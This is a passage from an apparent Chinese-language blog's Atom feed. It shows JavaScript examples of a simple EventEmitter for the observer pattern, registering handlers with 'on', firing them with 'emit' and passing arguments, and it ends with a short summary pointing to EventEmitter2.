</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.emit(<span class="string">'hello'</span>) <span class="comment">// -&gt; hello world</span></span><br></pre></td></tr></table></figure><p>传递参数时，可以直接在 <code>on</code> 执行函数中获取 <code>emit</code> 中传递的参数；<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.on(<span class="string">'hello'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span> + name)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.emit(<span class="string">'hello'</span>, <span class="string">'Mark'</span>) <span class="comment">// -&gt; hello Mark</span></span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上只是对观察者模式主体的一个简单实现，还有很多可以扩展的方法和优化的方案，这里我就不再继续写了。<br>如果你想了解更加完整的实现方式可以参考 <a href="https://github.com/asyncly/EventEmitter2">EventEmitter2</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己编写一个简单的 &lt;code&gt;EventEmitter&lt;/code&gt; 实现 &lt;code&gt;观察者模式&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
